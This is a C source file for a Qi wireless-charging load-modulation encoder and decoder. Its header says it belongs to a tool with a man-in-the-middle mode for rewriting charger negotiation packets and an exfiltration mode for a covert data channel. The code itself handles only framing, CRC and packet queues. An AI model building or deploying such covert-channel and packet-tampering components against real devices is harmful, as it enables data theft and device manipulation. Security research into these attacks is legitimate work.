/*
 * load_modulator.c — Qi load-modulation packet encoder/decoder
 *
 * Author:  jayis1
 * Copyright (C) 2026 jayis1
 * SPDX-License-Identifier: GPL-2.0
 *
 * Used by both the MITM mode (to rewrite negotiation packets) and the
 * EXFIL mode (to carry a covert channel). The physical bit-bang lives in
 * qi_rx.c; this module handles framing, CRC, and a tiny packet queue.
 */

#include "board.h"
#include "registers.h"

#define LM_QUEUE_SZ   32U
#define LM_MAX_PKT     18U   /* header(1) + data(16) + crc(1) */

typedef struct {
    uint8_t  data[LM_MAX_PKT];
    uint8_t  len;
} lm_frame_t;

static lm_frame_t g_tx_queue[LM_QUEUE_SZ];
static volatile uint8_t g_tx_head = 0, g_tx_tail = 0;
static lm_frame_t g_rx_queue[LM_QUEUE_SZ];
static volatile uint8_t g_rx_head = 0, g_rx_tail = 0;

int load_mod_init(void)
{
    g_tx_head = g_tx_tail = 0;
    g_rx_head = g_rx_tail = 0;
    return 0;
}

uint16_t load_mod_crc8(const uint8_t *data, uint16_t len)
{
    uint8_t crc = 0x00;
    for (uint16_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int b = 0; b < 8; b++)
            crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
    }
    return crc;
}

/* Covert-channel framing:
 *   [0xAA preamble(2)][magic 0x55][len(1)][payload(len)][crc8(1)]
 * Payload is opaque bytes supplied by the operator's endpoint. */

#define LM_MAGIC 0x55U

int load_mod_send(const uint8_t *data, uint16_t len)
{
    if (len > 16) return -1;
    uint8_t pkt[LM_MAX_PKT];
    uint8_t plen = 0;
    pkt[plen++] = 0xAA;  /* preamble byte 1 */
    pkt[plen++] = 0xAA;  /* preamble byte 2 */
    pkt[plen++] = LM_MAGIC;
    pkt[plen++] = (uint8_t)len;
    for (uint8_t i = 0; i < len; i++) pkt[plen++] = data[i];
    pkt[plen++] = (uint8_t)load_mod_crc8(&pkt[2], plen - 2);  /* CRC over magic..payload */

    /* Enqueue */
    uint8_t next = (g_tx_tail + 1) % LM_QUEUE_SZ;
    if (next == g_tx_head) return -1;  /* queue full */
    for (uint8_t i = 0; i < plen; i++)
        g_tx_queue[g_tx_tail].data[i] = pkt[i];
    g_tx_queue[g_tx_tail].len = plen;
    g_tx_tail = next;

    /* Drive the bit-banger immediately for the first queued frame. */
    if (g_tx_head != g_tx_tail) {
        lm_frame_t *f = &g_tx_queue[g_tx_head];
        qi_rx_send_packet(f->data + 3, f->len - 4);  /* skip preamble/magic */
        g_tx_head = (g_tx_head + 1) % LM_QUEUE_SZ;
    }
    return 0;
}

/* Decoder: called by the FPGA-side capture ISR (stubbed here) with a
 * candidate byte stream. Validates magic + CRC and enqueues the payload. */
int load_mod_push_rx(const uint8_t *raw, uint16_t len)
{
    if (len < 4 || len > LM_MAX_PKT) return -1;
    /* Find magic */
    uint16_t i = 0;
    while (i < len && raw[i] != LM_MAGIC) i++;
    if (i + 3 > len) return -1;
    uint8_t plen = raw[i + 1];
    if (i + 2 + plen + 1 > len) return -1;
    uint8_t crc_calc = (uint8_t)load_mod_crc8(&raw[i], plen + 2);
    if (raw[i + 2 + plen] != crc_calc) return -1;
    /* Enqueue payload */
    uint8_t next = (g_rx_tail + 1) % LM_QUEUE_SZ;
    if (next == g_rx_head) return -1;
    for (uint8_t k = 0; k < plen; k++)
        g_rx_queue[g_rx_tail].data[k] = raw[i + 2 + k];
    g_rx_queue[g_rx_tail].len = plen;
    g_rx_tail = next;
    return 0;
}

int load_mod_recv(uint8_t *buf, uint16_t buf_sz, uint16_t *out_len)
{
    if (g_rx_head == g_rx_tail) return -1;  /* empty */
    lm_frame_t *f = &g_rx_queue[g_rx_head];
    if (f->len > buf_sz) return -1;
    for (uint8_t i = 0; i < f->len; i++) buf[i] = f->data[i];
    *out_len = f->len;
    g_rx_head = (g_rx_head + 1) % LM_QUEUE_SZ;
    return 0;
}

uint8_t load_mod_tx_pending(void)
{
    return (g_tx_tail - g_tx_head) % LM_QUEUE_SZ;
}

uint8_t load_mod_rx_pending(void)
{
    return (g_rx_tail - g_rx_head) % LM_QUEUE_SZ;
}